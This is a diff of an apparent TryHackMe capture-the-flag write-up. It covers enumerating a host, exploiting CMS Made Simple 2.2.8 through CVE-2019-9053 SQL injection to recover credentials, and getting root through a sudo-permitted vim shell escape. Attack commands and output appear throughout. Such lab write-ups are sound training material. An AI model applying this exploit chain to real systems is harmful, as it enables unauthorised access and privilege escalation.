@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="simple.png" width=200 height=200 alt="simple">
+{{< post-img src="simple.png" alt="simple" style="width: 200px;" >}}
 
 ## Enumeraion
 
-### nmap
-
-```
+```bash
 PORT     STATE SERVICE REASON  VERSION
 21/tcp   open  ftp     syn-ack vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -48,9 +46,7 @@ PORT     STATE SERVICE REASON  VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-
-```
+```bash
 .htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12]
 [Status: 200, Size: 11321, Words: 3503, Lines: 376]
 .hta                    [Status: 403, Size: 289, Words: 22, Lines: 12]
@@ -64,23 +60,19 @@ simple                  [Status: 301, Size: 309, Words: 20, Lines: 10]
 They say its easy
 
 `robots.txt` is written by 'mike'
-
 fuzzing show a simple page with 301 code...we visited and got a simple page made with cms made simple (CMSMS)
-
 `This site is powered by CMS Made Simple version 2.2.8`
 
-okay then...of of the pages say
+okay then...one of the pages say
 
-```
+```text
 To get to the Administration Console you have to login as the administrator (with the username/password you mentioned during the installation process) on your site at http://yourwebsite.com/cmsmspath/admin. If this is your site click here to login.
 ```
 
 lets google
 
 Actually...found alot of cve that matches this version...but time-based sqli `CVE-2019-9053` was or best match
-
 There is an exploit from exploitdb provided...a python script we are gonna use
-
 Took me a bit to fix the script and make it work with python3 (I could just use python2 though)
 
 I had to :
@@ -93,7 +85,7 @@ I had to :
 
 Anyway I got results
 
-```
+```bash
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
 [+] Email found: admin@admin.com
@@ -108,7 +100,7 @@ And we get right into business!
 
 ## Priilege Escalation
 
-```
+```bash
 $ sudo -l
 User mitch may run the following commands on Machine:
 (root) NOPASSWD: /usr/bin/vim
@@ -122,20 +114,20 @@ then its easy peazy
 
 Then in vim we do:
 
-```
+```bash
 :!/bin/bash
 ```
 
 Ànd its over
 
-```
+```bash
 root@Machine:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Fastest privEsc in the west
 
-```
+```bash
 root@Machine:/root# cat root.txt
 ```
 
